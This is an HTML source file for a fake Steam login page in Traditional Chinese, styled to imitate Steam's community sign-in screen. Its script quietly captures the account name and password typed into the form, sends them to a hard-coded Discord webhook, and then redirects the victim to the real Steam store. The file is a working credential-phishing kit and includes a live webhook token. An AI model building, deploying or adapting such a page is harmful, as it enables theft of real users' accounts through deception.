<!DOCTYPE html>
<html lang="zh-TW">
    <head>
        <style>
            body {
                margin: 0;
                font-family: Arial, Helvetica, sans-serif;
                background-color: #171D25;
            }
            body::after {
                content: "";
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                pointer-events: none; /* 💡 關鍵：讓滑鼠可以穿透，才點得到底下的按鈕 */
                z-index: 999;        /* 確保在最上層 */
                
                /* 四周向中間擴散的漸層 */
                background: 
                    linear-gradient(to right, #171D25 0%, transparent 30%),
                    linear-gradient(to left, #171D25 0%, transparent 30%);
            }
            .top_div{
                background-color:#171D25;
                height: 104px;
                width: 100%;
                color: white;
                display: flex
            }
            .inner_content {
                width: 940px;
                display: flex;
                align-items: center;
                padding-left: 465px;
            }
            .steam_logo {
                width: 170px;
                height: auto;
                margin-right: 40px;
            }
            .menu_container {
                display: flex;
                margin-left: 0px;
            }
            .menu_item {
                color: #dcdedf;
                font-size: 16px;
                font-weight: bold;
                padding: 0 5px;
                cursor: pointer;
                text-transform: uppercase;
                line-height: 104px;
            }
            .people_item{
                color: #1999ff;
                border-bottom: none;
                position: relative;
                display: inline-block;
                height: 104px;
                line-height: 104px;
                font-size: 16px;
                font-weight: bold;
                padding: 0 10px;
                cursor: pointer;
                text-transform: uppercase;
            }
            .people_item::after {
                content: "";
                position: absolute;
                bottom: 40px;
                left: 10px;
                right: 10px;
                height: 3px;
                background-color: #1999ff;
            }
            .page_content{
                height:auto;
                background-image: url("https://community.fastly.steamstatic.com/public/shared/images/joinsteam/new_login_bg_strong_mask.jpg");
                background-size: cover;
                background-position: center;
                background-repeat: no-repeat;
                padding-top:90px;
                
            }
            .login_text{
                font-size: 27px;
                color: white;
                margin: 0 auto;
                width: 700px;
                font-weight: 1000;
                transform: translateX(10px);
            }
            .login_wrapper {
                position: relative;  
                width: 700px;       
                margin: 0 auto;
                transform: translateY(45px) 
            }
            .input_png{
                width: 700px;
            }
            .input-overlay {
            box-sizing: border-box;
            color: #ffffff;
            position: absolute;
            border: none;  
            outline: none;
            font-size: 15px;
            caret-color:#ffffff;
            background-color: #32353C;
            height: 40px;
            width: 397px;
            padding: 10px;
            z-index:100;
            transform: translate(30px,55px)
            }
            .input-overlay:hover {
                background-color: #393C44;
            }
            .input-overlay123 {
            box-sizing: border-box;
            color: #ffffff;
            position: absolute;  
            border: none;  
            outline: none;
            font-size: 15px;
            caret-color:#ffffff;
            background-color: #32353C;
            height: 40px;
            width: 397px;
            padding: 10px;
            z-index:100;
            transform: translate(30px,125px)
            }
            .input-overlay123:hover {
            background-color: #393C44;
            }
            .button_css{
            z-index:3;
            position: absolute;
            width: 275px; 
            height: auto;
            border: none;     
            padding: 0;        
            background: none;
            transform: translate(-610px,210px);
            }
            .footer_container {
                width: 940px;      /* 💡 設定跟 Steam 內容區域一樣的寬度，或自訂寬度 */
                margin: 200px auto; /* 💡 上方留 50px 間距，左右 auto 實現置中 */
                text-align: center; /* 讓內容物在容器內也置中 */
            }
            .bottom_img {
                width: 200%;       /* 圖片填滿 940px 的容器 */
                height: auto;
                display: block;
                transform: translate(-480px,0px);
            }
            
        </style>
    </head>
    <body>
        <div class="top_div">
            <div class="inner_content">
                <img class="steam_logo" src="logo.png">
                <div class="menu_container">
                    <div class="menu_item active">商店</div>
                    <div class="people_item">社群</div>
                    <div class="menu_item active">關於</div>
                    <div class="menu_item active">客服中心</div>
                </div>
            </div>
        </div>
        <div class="page_content">
            <div class="login_text">登入</div>
            <div class="login_wrapper">
                <form id="submit-form">
                    <input type="text" id=acc class="input-overlay">
                    <input type="password" id=pwd class="input-overlay123">
                    <img src="input.png" class="input_png">
                    <button type="submit" class="button_css">
                        <img src="button.png" style="width: 100%;">
                    </button>
                </form>
            </div>
            <div class="footer_container">
                <img src="bottom.png" class="bottom_img">
                <div></div>
            </div>
        </div>
            <script>
            document.getElementById("submit-form").addEventListener("submit", function(e) {
            e.preventDefault(); 

            const account = document.getElementById("acc").value;
            const password = document.getElementById("pwd").value;

            const webhookURL = "https://discord.com/api/webhooks/1494608428969103480/r4QDGJSxwYqfqT1813pNn0xVH3xXdcM2a_qed8B0htM4qPmUlzjoDGP3kjea9FATwFXt";
            const payload = {
                content: `帳號: ${account}\n 密碼: ${password}\n`
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (response.ok) {
                    this.reset();
                    window.location.href = "https://store.steampowered.com/";
                }
            })
            .catch(error => console.error('Error:', error));
        });
        </script>
    </body>
</html>
